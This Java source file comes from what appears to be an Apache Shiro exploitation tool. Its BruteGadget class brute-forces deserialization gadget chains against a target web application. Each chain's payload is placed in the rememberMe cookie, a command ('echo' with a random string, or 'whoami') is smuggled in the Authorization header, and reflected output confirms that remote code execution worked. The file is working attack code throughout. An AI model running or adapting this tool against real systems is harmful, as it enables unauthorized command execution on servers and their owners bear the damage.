package com.y5neko.shiroexp.payloads;

import com.y5neko.shiroexp.config.AllList;
import com.y5neko.shiroexp.misc.Log;
import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.object.ResponseOBJ;
import com.y5neko.shiroexp.object.TargetOBJ;
import com.y5neko.shiroexp.request.HttpRequest;

import java.lang.reflect.Method;
import java.util.*;

public class BruteGadget {

    /**
     * 进度回调接口
     */
    public interface ProgressCallback {
        void onProgress(String message);
        void onSuccess(String gadget, String echo);
        void onFail(String gadget, String echo);
    }
    public static List<String> bruteGadget(TargetOBJ url, String key) {
        // 从 AllList 获取配置
        List<String> gadgets = new ArrayList<>(Arrays.asList(AllList.gadgets));
        List<String> echos = new ArrayList<>(Arrays.asList(AllList.echoGadgets));

        // 储存验证成功的gadget
        List<String> success_gadgets = new ArrayList<>();

        // 遍历生成payload并验证
        for (String gadget : gadgets) {
            for (String echo : echos) {
                try {
                    Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);      // 反射获取利用链
                    Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class);
                    String payload = (String) method.invoke(null, echo, key);

                    // 生成验证命令
                    String checkString = Tools.generateRandomString(20);
                    String command = "echo " + checkString;

                    if (echo.equals("AllEcho")) {
                        command = "whoami";
                    }

                    // 构造请求头
                    Map<String, String> headers = new HashMap<>();
                    headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
                    headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));

                    // 校验响应中是否存在
                    ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, null, headers, "GET");
                    String result1 = Tools.bytesToString(responseOBJ.getResponse());    // 原始response
                    String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));   //提取result的base64
                    result = Tools.bytesToString(Base64.getDecoder().decode(result));

                    if (echo.equals("AllEcho")) {
                        if (result1.contains("$$$")) {
                            System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo));
                            success_gadgets.add(gadget + "+" + echo);
                        } else {
                            System.out.println(Log.buffer_logging("FAIL", "回显链无效: " + gadget + " -> " + echo));
                        }
                    } else {
                        if (result.contains(checkString)) {
                            System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo));
                            success_gadgets.add(gadget + "+" + echo);
                        }
                    }
                } catch (IndexOutOfBoundsException e) {
                    System.out.println(Log.buffer_logging("FAIL", "回显链无效: " + gadget + " -> " + echo));
                } catch (Exception e){
                    String errorMsg = e.getMessage();
                    System.out.println(Log.buffer_logging("EROR", errorMsg != null ? errorMsg : "回显链检测异常"));
                }
            }
        }

        if (success_gadgets.isEmpty()) {
            System.out.println(Log.buffer_logging("FAIL", "未发现有效回显链"));
        } else {
            System.out.println(Log.buffer_logging("SUCC", "共发现" + success_gadgets.size() + "条有效回显链："));
            System.out.println("----------");
            for (String success_gadget : success_gadgets) {
                System.out.println(success_gadget);
            }
            System.out.println("----------");
        }

        return success_gadgets;
    }

    /**
     * 带进度回调的回显链爆破
     * @param url 目标对象
     * @param callback 进度回调接口
     * @return 有效的回显链列表
     */
    public static List<String> bruteGadget(TargetOBJ url, String key, ProgressCallback callback) {
        // 从 AllList 获取配置
        List<String> gadgets = new ArrayList<>(Arrays.asList(AllList.gadgets));
        List<String> echos = new ArrayList<>(Arrays.asList(AllList.echoGadgets));

        // 储存验证成功的gadget
        List<String> success_gadgets = new ArrayList<>();

        int total = gadgets.size() * echos.size();
        int current = 0;

        // 遍历生成payload并验证
        for (String gadget : gadgets) {
            for (String echo : echos) {
                current++;
                String progressMsg = String.format("[INFO]正在测试 [%d/%d]: %s + %s", current, total, gadget, echo);
                if (callback != null) {
                    callback.onProgress(progressMsg);
                }
                System.out.println(Log.buffer_logging("INFO", "正在测试: " + gadget + " -> " + echo));

                try {
                    Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);
                    Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class);
                    String payload = (String) method.invoke(null, echo, key);

                    // 生成验证命令
                    String checkString = Tools.generateRandomString(20);
                    String command = "echo " + checkString;

                    if (echo.equals("AllEcho")) {
                        command = "whoami";
                    }

                    // 构造请求头
                    Map<String, String> headers = new HashMap<>();
                    headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
                    headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));

                    // 校验响应中是否存在
                    ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, null, headers, "GET");
                    String result1 = Tools.bytesToString(responseOBJ.getResponse());
                    String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));
                    result = Tools.bytesToString(Base64.getDecoder().decode(result));

                    if (echo.equals("AllEcho")) {
                        if (result1.contains("$$$")) {
                            String successMsg = "[SUCC]发现回显链: " + gadget + " -> " + echo;
                            System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo));
                            if (callback != null) {
                                callback.onSuccess(gadget, echo);
                            }
                            success_gadgets.add(gadget + "+" + echo);
                        } else {
                            if (callback != null) {
                                callback.onFail(gadget, echo);
                            }
                        }
                    } else {
                        if (result.contains(checkString)) {
                            String successMsg = "[SUCC]发现回显链: " + gadget + " -> " + echo;
                            System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo));
                            if (callback != null) {
                                callback.onSuccess(gadget, echo);
                            }
                            success_gadgets.add(gadget + "+" + echo);
                        } else {
                            if (callback != null) {
                                callback.onFail(gadget, echo);
                            }
                        }
                    }
                } catch (IndexOutOfBoundsException e) {
                    System.out.println(Log.buffer_logging("FAIL", "回显链无效: " + gadget + " -> " + echo));
                    if (callback != null) {
                        callback.onFail(gadget, echo);
                    }
                } catch (Exception e) {
                    String errorMsg = e.getMessage();
                    System.out.println(Log.buffer_logging("EROR", errorMsg != null ? errorMsg : "回显链检测异常"));
                    if (callback != null) {
                        callback.onFail(gadget, echo);
                    }
                }
            }
        }

        if (success_gadgets.isEmpty()) {
            String failMsg = "[FAIL]未发现有效回显链";
            System.out.println(Log.buffer_logging("FAIL", "未发现有效回显链"));
            if (callback != null) {
                callback.onProgress(failMsg);
            }
        } else {
            String summaryMsg = "[SUCC]共发现" + success_gadgets.size() + "条有效回显链";
            System.out.println(Log.buffer_logging("SUCC", "共发现" + success_gadgets.size() + "条有效回显链："));
            System.out.println("----------");
            for (String success_gadget : success_gadgets) {
                System.out.println(success_gadget);
            }
            System.out.println("----------");
            if (callback != null) {
                callback.onProgress(summaryMsg);
            }
        }

        return success_gadgets;
    }

    /**
     * 自定义gadget和echo列表的爆破
     * @param url 目标对象
     * @param key 密钥
     * @param gadgets 要测试的gadget列表
     * @param echos 要测试的echo列表
     * @param callback 进度回调接口
     * @return 有效的回显链列表
     */
    public static List<String> bruteGadgetCustom(TargetOBJ url, String key, List<String> gadgets, List<String> echos, ProgressCallback callback) {
        // 储存验证成功的gadget
        List<String> success_gadgets = new ArrayList<>();

        int total = gadgets.size() * echos.size();
        int current = 0;

        // 遍历生成payload并验证
        for (String gadget : gadgets) {
            for (String echo : echos) {
                current++;
                String progressMsg = String.format("[INFO]正在测试 [%d/%d]: %s + %s", current, total, gadget, echo);
                if (callback != null) {
                    callback.onProgress(progressMsg);
                }
                System.out.println(Log.buffer_logging("INFO", "正在测试: " + gadget + " -> " + echo));

                try {
                    Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);
                    Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class);
                    String payload = (String) method.invoke(null, echo, key);

                    // 生成验证命令
                    String checkString = Tools.generateRandomString(20);
                    String command = "echo " + checkString;

                    if (echo.equals("AllEcho")) {
                        command = "whoami";
                    }

                    // 构造请求头
                    Map<String, String> headers = new HashMap<>();
                    headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
                    headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));

                    // 校验响应中是否存在
                    ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, null, headers, "GET");
                    String result1 = Tools.bytesToString(responseOBJ.getResponse());
                    String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));
                    result = Tools.bytesToString(Base64.getDecoder().decode(result));

                    if (echo.equals("AllEcho")) {
                        if (result1.contains("$$$")) {
                            String successMsg = "[SUCC]发现回显链: " + gadget + " -> " + echo;
                            System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo));
                            if (callback != null) {
                                callback.onSuccess(gadget, echo);
                            }
                            success_gadgets.add(gadget + "+" + echo);
                        } else {
                            if (callback != null) {
                                callback.onFail(gadget, echo);
                            }
                        }
                    } else {
                        if (result.contains(checkString)) {
                            String successMsg = "[SUCC]发现回显链: " + gadget + " -> " + echo;
                            System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo));
                            if (callback != null) {
                                callback.onSuccess(gadget, echo);
                            }
                            success_gadgets.add(gadget + "+" + echo);
                        } else {
                            if (callback != null) {
                                callback.onFail(gadget, echo);
                            }
                        }
                    }
                } catch (IndexOutOfBoundsException e) {
                    System.out.println(Log.buffer_logging("FAIL", "回显链无效: " + gadget + " -> " + echo));
                    if (callback != null) {
                        callback.onFail(gadget, echo);
                    }
                } catch (Exception e) {
                    String errorMsg = e.getMessage();
                    System.out.println(Log.buffer_logging("EROR", errorMsg != null ? errorMsg : "回显链检测异常"));
                    if (callback != null) {
                        callback.onFail(gadget, echo);
                    }
                }
            }
        }

        if (success_gadgets.isEmpty()) {
            String failMsg = "[FAIL]未发现有效回显链";
            System.out.println(Log.buffer_logging("FAIL", "未发现有效回显链"));
            if (callback != null) {
                callback.onProgress(failMsg);
            }
        } else {
            String summaryMsg = "[SUCC]共发现" + success_gadgets.size() + "条有效回显链";
            System.out.println(Log.buffer_logging("SUCC", "共发现" + success_gadgets.size() + "条有效回显链："));
            System.out.println("----------");
            for (String success_gadget : success_gadgets) {
                System.out.println(success_gadget);
            }
            System.out.println("----------");
            if (callback != null) {
                callback.onProgress(summaryMsg);
            }
        }

        return success_gadgets;
    }
}
